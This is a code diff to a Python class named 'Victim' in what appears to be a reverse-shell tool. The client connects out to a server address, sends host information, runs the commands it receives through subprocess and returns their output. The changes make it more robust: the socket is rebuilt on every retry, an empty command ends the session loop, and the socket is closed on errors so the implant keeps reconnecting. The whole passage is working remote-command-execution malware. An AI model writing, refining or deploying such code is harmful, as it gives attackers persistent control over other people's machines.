@@ -33,16 +33,19 @@ class Victim:
             return subprocess.getoutput(command, encoding=Const.ENCODING)
 
     def connect(self, srv_ip: str, srv_port: int) -> None:
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
         while True:
             try:
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 self.socket.connect((srv_ip, srv_port))
                 self.socket.send(json.dumps(self.info).encode(encoding=Const.ENCODING))
 
                 while True:
                     command = self.socket.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
+
+                    if not command:
+                        break
+
                     output = self.handle(command.strip())
 
                     if not output:
@@ -51,5 +54,6 @@ class Victim:
                     self.socket.send(output.encode(encoding=Const.ENCODING))
 
             except Exception:
+                self.socket.close()
                 time.sleep(Const.CONNECTION_TIMEOUT)
                 continue
